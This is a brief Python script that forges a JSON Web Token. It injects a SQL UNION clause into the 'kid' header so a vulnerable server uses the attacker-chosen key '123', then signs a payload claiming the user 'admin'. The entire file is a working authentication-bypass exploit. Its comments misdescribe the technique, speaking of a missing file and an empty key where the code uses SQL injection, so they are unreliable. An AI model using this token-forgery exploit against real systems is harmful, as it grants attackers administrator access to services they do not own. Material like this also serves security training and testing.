import base64
import hashlib
import hmac
import json


def get_jwt_signature(jwt_key, token_payload):
    return base64.urlsafe_b64encode(hmac.new(bytes(jwt_key, encoding='utf8'), token_payload.encode('utf8'), hashlib.sha256)
                                    .digest()).decode('UTF-8').rstrip("=")


def get_jwt_base64_encode(json_data):
    return base64.urlsafe_b64encode(bytes(json.dumps(json_data), encoding='utf8')).decode('utf8').rstrip("=")


Headers = {
    "typ": "JWT",
    "alg": "HS256",
    "kid": "aaaaaaaa' UNION SELECT '123" # The file is used to sign the key. To exploit, we can use a non-existence path
}

Payload = {
    "user" : "admin"
}

key = "123"  # Key is empty because the file does not exist

header = get_jwt_base64_encode(Headers)
payload = get_jwt_base64_encode(Payload)
signature = get_jwt_signature(key, header + "." + payload)
print(header + "." + payload + "." + signature)
